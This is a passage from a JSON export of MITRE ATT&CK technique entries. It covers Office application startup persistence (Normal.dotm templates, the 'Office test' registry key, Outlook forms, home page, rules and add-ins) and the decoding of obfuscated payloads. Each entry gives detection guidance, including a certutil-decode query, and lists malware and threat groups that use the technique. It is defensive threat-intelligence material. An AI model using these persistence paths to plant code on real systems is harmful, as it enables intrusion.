    "Description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.[1]Office Visual Basic for Applications (VBA) macros[2]can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.[3][4]Shared templates may also be stored and pulled from remote locations.[5]Word Normal.dotm location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotmExcel Personal.xlsb location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm underC:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.[5]An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse Microsoft Office templates to obtain persistence on a compromised system.",
      "Monitor for newly constructed files that may abuse Microsoft Office templates to obtain persistence on a compromised system.",
      "Monitor for changes made to files that may abuse Microsoft Office templates to obtain persistence on a compromised system. Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated",
      "Monitor newly executed processes that may abuse Microsoft Office templates to obtain persistence on a compromised system.",
      "Collect events related to Registry key creation for keys that could be used for Office-based persistence.[11][12]",
      "Collect events related to Registry key modification for keys that could be used for Office-based persistence.[11][12]"
    ],
    "Procedure Examples": [
      "BackConfighas the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.[6]",
      "Cobalt Strikehas the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.[7]",
      "MuddyWaterhas used a Word Template, Normal.dotm, for persistence.[8]"
    ]
  },
  "T1137.002": {
    "Name": "Office Application Startup:Office Test",
    "Description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.[1][2]There exist user and global Registry keys for the Office Test feature, such as:HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\PerfHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system.",
      "Monitor for newly constructed files that may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system.",
      "Monitor for changes made to files that may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor newly executed processes that may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system.",
      "Monitor for the creation of the Office Test Registry key. Collect events related to Registry key creation for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.[2]",
      "Monitor for changes made to the Office Test Registry key. Collect events related to Registry key modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.[2]"
    ],
    "Procedure Examples": [
      "APT28has used the Office Test persistence mechanism within Microsoft Office by adding the Registry keyHKCU\\Software\\Microsoft\\Office test\\Special\\Perfto execute code.[2]"
    ]
  },
  "T1137.003": {
    "Name": "Office Application Startup:Outlook Forms",
    "Description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.[1]Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.[1]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse Microsoft Outlook forms to obtain persistence on a compromised system. SensePost, whose toolRulercan be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[5]",
      "Monitor executed commands and arguments that may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.[6]",
      "Monitor newly executed processes that may abuse Microsoft Outlook forms to obtain persistence on a compromised system."
    ],
    "Procedure Examples": [
      "Rulercan be used to automate the abuse of Outlook Forms to establish persistence.[2]"
    ]
  },
  "T1137.004": {
    "Name": "Office Application Startup:Outlook Home Page",
    "Description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.[1]Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.[1]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. SensePost, whose toolRulercan be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[6]",
      "Monitor executed commands and arguments that may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.[7]",
      "Monitor newly executed processes that may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system."
    ],
    "Procedure Examples": [
      "OilRighas abused the Outlook Home Page feature for persistence.OilRighas also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.[2]",
      "Rulercan be used to automate the abuse of Outlook Home Pages to establish persistence.[3]"
    ]
  },
  "T1137.005": {
    "Name": "Office Application Startup:Outlook Rules",
    "Description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.[1]Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.[1]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may abuse Microsoft Outlook rules to obtain persistence on a compromised system. SensePost, whose toolRulercan be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[6]",
      "Monitor executed commands and arguments that may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.[7]This PowerShell script is ineffective in gathering rules with modified PR_RULE_MSG_NAME and PR_RULE_MSG_PROVIDER properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.[8]",
      "Monitor newly executed processes that may abuse Microsoft Outlook rules to obtain persistence on a compromised system."
    ],
    "Procedure Examples": [
      "Rulercan be used to automate the abuse of Outlook Rules to establish persistence.[2]"
    ]
  },
  "T1137.006": {
    "Name": "Office Application Startup:Add-ins",
    "Description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.[1]There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins.[2][3]Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
    "Detects": [
      "Monitor executed commands and arguments that may abuse Microsoft Office add-ins to obtain persistence on a compromised system.",
      "Monitor for newly constructed files that may abuse Microsoft Office add-ins to obtain persistence on a compromised system.",
      "Monitor for changes made to files that may abuse Microsoft Office add-ins to obtain persistence on a compromised system.",
      "Monitor newly executed processes that may abuse Microsoft Office add-ins to obtain persistence on a compromised system.",
      "Audit the Registry entries relevant for enabling add-ins.[8][2]",
      "Audit the Registry entries relevant for enabling add-ins.[8][2]"
    ],
    "Procedure Examples": [
      "Bisonalhas been loaded through a.wllextension added to the%APPDATA%\\microsoft\\word\\startup\\repository.[4]",
      "LunarLoaderhas the ability to use Microsoft Outlook add-ins to establish persistence.[5]",
      "LunarMailhas the ability to use Outlook add-ins for persistence.[5]",
      "Naikonhas used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.[6]"
    ]
  },
  "T1140": {
    "Name": "Deobfuscate/Decode Files or Information",
    "Description": "Adversaries may useObfuscated Files or Informationto hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use ofcertutilto decode a remote access tool portable executable file that has been hidden inside a certificate file.[1]Another example is using the Windowscopy /bortypecommand to reassemble binary fragments into a malicious payload.[2][3]Sometimes a user's action may be required to open it for deobfuscation or decryption as part ofUser Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.[4]",
    "Detects": [
      "Monitor for changes made to files for unexpected modifications that attempt to hide artifacts. On Windows, Event ID 4663 (Security Log - An attempt was made to access an object) can be used to alert on suspicious file accesses (e.g., attempting to write to a file which shouldn’t be further modified) that may coincide with attempts to hide artifacts.",
      "Monitor for newly executed processes that attempt to hide artifacts of an intrusion, such as common archive file applications and extensions (ex: Zip and RAR archive tools), and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.CertUtil.exe may be used to encode and decode a file, including PE and script code. Encoding will convert a file to base64 with -----BEGIN CERTIFICATE----- and -----END CERTIFICATE----- tags. Malicious usage will include decoding an encoded file that was downloaded. Once decoded, it will be loaded by a parallel process. Note that there are two additional command switches that may be used - encodehex and decodehex. Similarly, the file will be encoded in HEX and later decoded for further execution. During triage, identify the source of the file being decoded. Review its contents or execution behavior for further analysis.Analytic Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The analytic is oriented around the creation of CertUtil.exe processes, which may be used to encode and decode files, including PE and script code. Malicious usage will include decoding a encoded file that was downloaded. Once decoded, it will be loaded by a parallel process.Analytic 1 - CertUtil with Decode Argument(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\System32\\certutil.exe\" AND  CommandLine=decode)",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "ABKhas the ability to decrypt AES encrypted payloads.[5]",
      "Action RATcan use Base64 to decode actor-controlled C2 server communications.[6]",
      "Agent Teslahas the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.[7]",
      "Agriushas deployed base64-encoded variants ofASPXSpyto evade detection.[8]",
      "Amadeyhas decoded antivirus name strings.[9]",
      "Apostlecompiled code is obfuscated in an unspecified fashion prior to delivery to victims.[8]",
      "AppleJeushas decoded files received from a C2.[10]",
      "AppleSeedcan decode its payload prior to execution.[11]",
      "AnAPT19HTTP malware variant decrypts strings using single-byte XOR keys.[12]",
      "AnAPT28macro uses the commandcertutil -decodeto decode contents of a .txt file storing the base64 encoded payload.[13][14]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28unarchived data using the GUI version of WinRAR.[15]",
      "APT38has used the RC4 algorithm to decrypt configuration data.[16]",
      "APT39has used malware to decrypt encrypted CAB files.[17]",
      "ArcaneDoorinvolved the use of Base64 obfuscated scripts and commands.[18]",
      "Aria-bodyhas the ability to decrypt the loader configuration and payload DLL.[19]",
      "Astarothuses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code.[20][21]",
      "AuditCreduses XOR and RC4 to perform decryption on the code functions.[22]",
      "Avaddonhas decrypted encrypted strings.[23]",
      "Avengerhas the ability to decrypt files downloaded from C2.[5]",
      "AvosLockerhas deobfuscated XOR-encoded strings.[24]",
      "Azorultuses an XOR key to decrypt content and uses Base64 to decode the C2 address.[25][26]",
      "Babukhas the ability to unpack itself into memory using XOR.[27][28]",
      "BabySharkhas the ability to decode downloaded files prior to execution.[29]",
      "BackConfighas used a custom routine to decrypt strings.[30]",
      "BADFLICKcan decode shellcode using a custom rotating XOR cipher.[31]",
      "Bandookhas decoded its PowerShell script.[32]",
      "Bankshotdecodes embedded XOR strings.[33]",
      "Bazarcan decrypt downloaded payloads.Bazaralso resolves strings and other artifacts at runtime.[34][35]",
      "BBKhas the ability to decrypt AES encrypted payloads.[5]",
      "BBSRATusesExpandto decompress a CAB file into executable content.[36]",
      "BendyBearhas decrypted function blocks using a XOR key during runtime to evade detection.[37]",
      "Bisonalhas decoded strings in the malware using XOR and RC4.[38][39]",
      "BlackBytehas encoded commands in base64-encoded sections concatenated together in PowerShell.[40]BlackByteuses PowerShell commands to disable Windows Defender.[41]",
      "BlackByte Ransomwareis distributed as an obfuscated JavaScript launcher file.[42]",
      "BLINDINGCANhas used AES and XOR to decrypt its DLLs.[43]",
      "BoomBoxcan decrypt AES-encrypted files downloaded from C2.[44]",
      "BOOSTWRITEhas used a a 32-byte long multi-XOR key to decode data inside its payload.[45]",
      "BRONZE BUTLERdownloads encoded payloads and decodes them on the victim.[46]",
      "Brute Ratel C4has the ability to deobfuscate its payload prior to execution.[47]",
      "Bumblebeecan deobfuscate C2 server responses and unpack its code on targeted hosts.[48][49]",
      "Bundlorehas usedopensslto decrypt AES encrypted payload data.Bundlorehas also used base64 and RC4 with a hardcoded key to deobfuscate data.[50]",
      "BUSHWALKcan Base64 decode and RC4 decrypt malicious payloads sent through a web request’s command parameter.[51][52]",
      "DuringC0017,APT41used the DUSTPAN loader to decrypt embedded payloads.[53]",
      "DuringC0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string'FromBase'+0x40+'String', in place ofFromBase64Stringwhich is normally used to decode base64.[54][55]",
      "Carbondecrypts task and configuration files for execution.[56][57]",
      "Cardinal RATdecodes many of its artifacts and is decrypted (AES-128) after being downloaded.[58]",
      "certutilhas been used to decode binaries hidden inside certificate files as Base64 information.[1]",
      "Chaeshas decrypted an AES encrypted binary file to trigger the download of other files.[59]",
      "CharmPowercan decrypt downloaded modules prior to execution.[60]",
      "CHIMNEYSWEEPcan use an embedded RC4 key to decrypt Windows API function strings.[61]",
      "TheChinoxydropping function can initiate decryption of its config file.[62]",
      "Chrommmecan decrypt its encrypted internal code.[63]",
      "Cinnamon Tempesthas used weaponized DLLs to load and decrypt payloads.[64]",
      "Clamblingcan deobfuscate its payload prior to execution.[65][66]",
      "Clophas used a simple XOR operation to decrypt strings.[67]",
      "COATHANGERdecodes configuration items from a bundled file for command and control activity.[68]",
      "Cobalt Strikecan deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.[69][70]",
      "CoinTickerdecodes the initially-downloaded hidden encoded file using OpenSSL.[71]",
      "ComRAThas used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module.ComRAThas also used a unique password to decrypt the file used for its hidden file system.[72][73]",
      "Contihas decrypted its payload using a hardcoded AES-256 key.[74][75]",
      "CookieMinerhas used Google Chrome's decryption and extraction operations.[76]",
      "CostaBrickshas the ability to use bytecode to decrypt embedded payloads.[77]",
      "Crimsoncan decode its encoded PE file prior to execution.[78]",
      "Cuckoo Stealerstrings are deobfuscated prior to execution.[79][80]",
      "Cyclops Blinkcan decrypt and parse instructions sent from C2.[81]",
      "DanBotcan use a VBA macro to decode its payload prior to installation and execution.[82]",
      "DarkGateinstallation includes binary code stored in a file located in a hidden directory, such asshell.txt, that is decrypted then executed.[83]DarkGateuses hexadecimal-encoded shellcode payloads during installation that are called via Windows APICallWindowProc()to decode and then execute.[84]",
      "Darkhotelhas decrypted strings and imports using RC4 during execution.[85][86]",
      "DarkTortillacan decrypt its payload and associated configuration elements using the Rijndael cipher.[87]",
      "DarkWatchmanhas the ability to self-extract as a RAR archive.[88]",
      "DDKONGdecodes an embedded configuration using XOR.[89]",
      "DEADEYEhas the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.[53]",
      "DEADWOODXORs some strings within the binary using the value0xD5, and deobfuscates these items at runtime.[8]",
      "Deniswill decrypt important strings used for C&C communication.[90]",
      "DropBookcan unarchive data downloaded from the C2 to obtain the payload and persistence modules.[91]",
      "Drovorubhas de-obsfuscated XOR encrypted payloads in WebSocket messages.[92]",
      "Dtrackhas used a decryption routine that is part of an executable physical patch.[93]",
      "DUSTPANdecodes and decrypts embedded payloads.[94]",
      "DUSTTRAPdeobfuscates embedded payloads.[94]",
      "Dyredecrypts resources needed for targeting the victim.[95][96]",
      "Earth Luscahas usedcertutilto decode a string into a cabinet file.[97]",
      "Eburyhas verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.[98]",
      "Ecipekachas the ability to decrypt fileless loader modules.[99]",
      "Egregorhas been decrypted before execution.[100][101]",
      "Emotethas used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.[102]",
      "EnvyScoutcan deobfuscate and write malicious ISO files to disk.[44]",
      "Exaramel for Linuxcan decrypt its configuration file.[103]",
      "Exbytedecodes and decrypts data stored in the configuration file with a key provided on the command line during execution.[104]",
      "Expandcan be used to decompress a local or remote CAB file into an executable.[105]",
      "FatDukecan decrypt AES encrypted C2 communications.[106]",
      "FIN13has utilizedcertutilto decode base64 encoded versions of custom malware.[107]",
      "Final1stspyuses Python code to deobfuscate base64-encoded strings.[108]",
      "FinFisherextracts and decrypts stage 3 malware, which is stored in encrypted resources.[109][110]",
      "FIVEHANDShas the ability to decrypt its payload prior to execution.[111][112][113]",
      "FoggyWebcan be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.[114]",
      "FRAMESTINGcan decompress data received withinPOSTrequests.[51]",
      "DuringFrankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.[115]",
      "FYAntihas the ability to decrypt an embedded .NET module.[99]",
      "Gamaredon Grouptools decrypted additional payloads from the C2.Gamaredon Grouphas also decoded base64-encoded source code of a downloader.[116][117]Additionally,Gamaredon Grouphas decoded Telegram content to reveal the IP address for C2 communications.[118]",
      "Gelsemiumcan decompress and decrypt DLLs and shellcode.[63]",
      "gh0st RAThas decrypted and loaded thegh0st RATDLL into memory, once the initial dropper executable is launched.[119]",
      "GLASSTOKENhas the ability to decode hexadecimal and Base64 C2 requests.[120]",
      "GoldMaxhas decoded and decrypted the configuration file when executed.[121][122]",
      "Goopyhas used a polymorphic decryptor to decrypt itself at runtime.[90]",
      "Gootloaderhas the ability to decode and decrypt malicious payloads prior to execution.[123][124]",
      "Gorgon Groupmalware can decode contents from a payload that was Base64 encoded and write the contents to a file.[125]",
      "Grandoreirocan decrypt its encrypted internal strings.[126]",
      "Green Lambertcan use multiple custom routines to decrypt strings prior to execution.[127][128]",
      "GrimAgentcan use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.[129]",
      "Hancitorhas decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document.Hancitorhas also extracted executables from ZIP files.[130][131]",
      "HermeticWipercan decompress and copy driver files usingLZCopy.[132]",
      "Heyoka Backdoorcan decrypt its payload prior to execution.[133]",
      "HiddenWaspuses a cipher to implement a decoding function.[134]",
      "Higaisaused certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.[135][136]",
      "Hildegardhas decrypted ELF files with AES.[137]",
      "HUI Loadercan decrypt and load files containing malicious payloads.[138]",
      "HyperBrocan unpack and decrypt its payload prior to execution.[65][139]",
      "IceApplecan use a Base64-encoded AES key to decrypt tasking.[140]",
      "Imminent Monitorhas decoded malware components that are then dropped to the system.[141]",
      "INC Ransomwarecan runCryptStringToBinaryAto decrypt base64 content containing its ransom note.[142]",
      "Industroyerdecrypts code to connect to a remote C2 server.[143]",
      "InvisiMolecan decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.[144][145]",
      "IronNetInjectorhas the ability to decrypt embedded .NET and PE payloads.[146]",
      "ISMInjectoruses thecertutilcommand to decode a payload file.[147]",
      "DuringJuicy Mix,OilRigused a script to concatenate and deobfuscate encoded strings inMango.[148]",
      "Kapekautilizes obfuscated JSON structures for various data storage and configuration management items.[149]",
      "Ke3changhas deobfuscated Base64-encoded shellcode strings prior to loading them.[150]",
      "Kerrdowncan decode, decrypt, and decompress multiple layers of shellcode.[151]",
      "Kesselhas decrypted the binary's configuration once themainfunction was launched.[152]",
      "KEYPLUGcan decode its configuration file to determine C2 protocols.[53]",
      "KGH_SPYcan decrypt encrypted strings and write them to a newly created folder.[153]",
      "Kimsukyhas decoded malicious VBScripts using Base64.[154]",
      "Kobalosdecrypts strings right after the initial communication, but before the authentication process.[155]",
      "KOCTOPUShas deobfuscated itself before executing its commands.[156]",
      "KONNIhas used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.[157][158]",
      "Kwampirsdecrypts and extracts a copy of its main DLL payload when executing.[159]",
      "Latrodectushas the ability to deobfuscate encrypted strings.[160][161][162]",
      "Lazarus Grouphas used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.[163][164]",
      "Leviathanhas used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.[165]",
      "LightNeuronhas used AES and XOR to decrypt configuration files and commands.[166]",
      "LIGHTWIREcan RC4 decrypt and Base64 decode C2 commands.[51]",
      "Line Dancershellcode payloads are base64 encoded when transmitted to compromised devices.[167]",
      "LiteDukehas the ability to decrypt and decode multiple layers of obfuscation.[106]",
      "Lizarcan decrypt its configuration data.[168]",
      "LockBit 2.0can decode scripts and strings in loaded modules.[169][170]",
      "TheLockBit 3.0payload is decrypted at runtime.[171][172][173]",
      "Lokibothas decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.[174]",
      "LookBackhas a function that decrypts malicious data.[175]",
      "Lucifercan decrypt its C2 address upon execution.[176]",
      "Lumma Stealerhas used Base64-encoded content during execution, decoded via PowerShell.[177]",
      "LunarLoadercan deobfuscate files containing the next stages in the infection chain.[178]",
      "LunarMailcan decrypt strings to retrieve configuration settings.[178]",
      "LunarWebcan decrypt strings related to communication configuration using RC4 with a static key.[178]",
      "Machete’s downloaded data is decrypted using AES.[179]",
      "MacMadecrypts a downloaded file using AES-128-EBC with a custom delta.[180]",
      "Mafaldacan decrypt files and data.[181]",
      "MagicRATstores command and control URLs using base64 encoding in the malware's configuration file.[182]",
      "Malteirohas the ability to deobfuscate downloaded files prior to execution.[183]",
      "MegaCortexhas used a Base64 key to decode its components.[184]",
      "menuPasshas usedcertutilin a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also usedcertutil -decodeto decode files on the victim’s machine when droppingUPPERCUT.[185][186]",
      "After checking for the existence of two files, keyword_parm.txt and parm.txt,MESSAGETAPXOR decodes and read the contents of the files.[187]",
      "metaMaincan decrypt and load other modules.[181]",
      "Upon execution,Metamorfohas unzipped itself after being downloaded to the system and has performed string decryption.[188][189][190]",
      "MirageFoxhas a function for decrypting data containing C2 configuration information.[191]",
      "Mispadudecrypts its encrypted configuration files prior to execution.[183][192]",
      "Moleratsdecompresses ZIP files once on the victim machine.[193]",
      "Mongallhas the ability to decrypt its payload prior to execution.[133]",
      "Moonstone Sleetdelivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis.[194]",
      "More_eggswill decode malware components that are then dropped to the system.[195]",
      "Morican resolve networking APIs from strings that are ADD-encrypted.[196]",
      "MuddyWaterhas decoded base64-encoded PowerShell, JavaScript, and VBScript.[197][198][199][200]",
      "NativeZonecan decrypt and decode embeddedCobalt Strikebeacon stage shellcode.[44]",
      "Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to theNetwalkerDLL being loaded into memory.[201]",
      "Nightdoorstores network configuration data in a file XOR encoded with the key value of0x7A.[202]",
      "TheNinjaloader component can decrypt and decompress the payload.[203][204]",
      "NOKKIuses a unique, custom de-obfuscation technique.[205]",
      "ODAgentcan Base64-decode and XOR decrypt received C2 commands.[206]",
      "OilBoostercan Base64-decode and XOR-decrypt C2 commands taken from JSON files.[206]",
      "AOilRigmacro has run a PowerShell command to decode file contents.OilRighas also usedcertutilto decode base64-encoded files on victims.[207][147][208][209]",
      "Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.[210]",
      "OnionDukecan use a custom decryption algorithm to decrypt strings.[106]",
      "OopsIEconcatenates then decompresses multiple resources to load an embedded .Net Framework assembly.[208]",
      "DuringOperation Dust Storm, attackers used VBS code to decode payloads.[211]",
      "DuringOperation Honeybee, malicious files were decoded prior to execution.[212]",
      "ForOperation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.[213]",
      "OSX/Shlayercan base64-decode and AES-decrypt downloaded payloads.[214]Versions ofOSX/Shlayerpass encrypted and password-protected code toopenssland then write the payload to the/tmpfolder.[215][216]",
      "OSX_OCEANLOTUS.Duses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as therotatefunction in reporting.[217]",
      "P.A.S. Webshellcan use a decryption mechanism to process a user supplied password and allow execution.[103]",
      "PcSharehas decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.[62]",
      "Pikabotdecrypts command and control URIs using ADVobfuscator, and decrypts IP addresses and port numbers with a custom algorithm.[218]Other versions ofPikabotdecode chunks of stored stage 2 payload content in the initial payload.textsection before consolidating them for further execution.[219]OverallLunarMailis associated with multiple encoding and encryption mechanisms to obfuscate the malware's presence and avoid analysis or detection.[220]",
      "Pillowminthas been decompressed by included shellcode prior to being launched.[221]",
      "PingPullcan decrypt received data from its C2 server by using AES.[222]",
      "PipeMoncan decrypt password-protected executables.[223]",
      "PITSTOPcan deobfuscate base64 encoded and AES encrypted commands.[52]",
      "PlugXdecompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.[224][65][225]",
      "PoetRAThas used LZMA and base64 libraries to decode obfuscated scripts.[226]",
      "PolyglotDukecan use a custom algorithm to decrypt strings used by the malware.[106]",
      "PowerExchangecan decode and decrypt C2 commands received via email.[227]",
      "PowerLesscan use base64 and AES ECB decryption prior to execution of downloaded modules.[228]",
      "POWERSTATScan deobfuscate the main backdoor code.[199]",
      "PowGoopcan decrypt PowerShell scripts for execution.[196][229]",
      "Protonuses an encrypted file to store commands and configuration values.[230]",
      "PS1can use an XOR key to decrypt a PowerShell loader and payload binary.[77]",
      "Pteranodoncan decrypt encrypted data strings prior to using them.[231]",
      "PUNCHBUGGYhas usedPowerShellto decode base64-encoded assembly.[232]",
      "PyDCrypthas decrypted and dropped theDCSrvpayload to disk.[233]",
      "QakBotcan deobfuscate and re-assemble code strings for execution.[234][235][236]",
      "QUADAGENTuses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.[237]",
      "QUIETCANARYcan use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.[238]",
      "Raccoon Stealeruses RC4-encrypted, base64-encoded strings to obfuscate functionality and command and control servers.[239][240]",
      "Raindropdecrypted itsCobalt Strikepayload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.[241][242]",
      "RainyDaycan decrypt its payload via a XOR key.[243]",
      "Ramsaycan extract its agent from the body of a malicious document.[244]",
      "RansomHubcan use a provided passphrase to decrypt its configuration file.[245]",
      "RAPIDPULSElistens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremterhmacTime. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.[246]",
      "Raspberry Robincontains several layers of obfuscation to hide malicious code from detection and analysis.[247]",
      "RDATcan deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.[248]",
      "RegDukecan decrypt strings with a key either stored in the Registry or hardcoded in the code.[106]",
      "Remexidecrypts the configuration data using XOR with 25-character keys.[249]",
      "REvilcan decode encrypted strings to enable execution of commands and payloads.[250][251][252][253][254][255]",
      "RGDoordecodes Base64 strings and decrypts strings using a custom XOR algorithm.[256]",
      "Rising Sunhas decrypted itself using a single-byte XOR scheme. Additionally,Rising Suncan decrypt its configuration data at runtime.[257]",
      "ROADSWEEPcan decrypt embedded scripts prior to execution.[61][258]",
      "Rockehas extracted tar.gz files after downloading them from a C2 server.[259]",
      "RogueRobindecodes an embedded executable using base64 and decompresses it.[260]",
      "ROKRATcan decrypt strings using the victim's hostname as the key.[261][262]",
      "RotaJakirouses the AES algorithm, bit shifts in a function calledrotate, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and theheadandkeysections in the network packet structure used for C2 communications.[263]",
      "Sagerunexuses a custom decryption routine to unpack itself during installation.[264]",
      "Saint Botcan deobfuscate strings and files for execution.[265]",
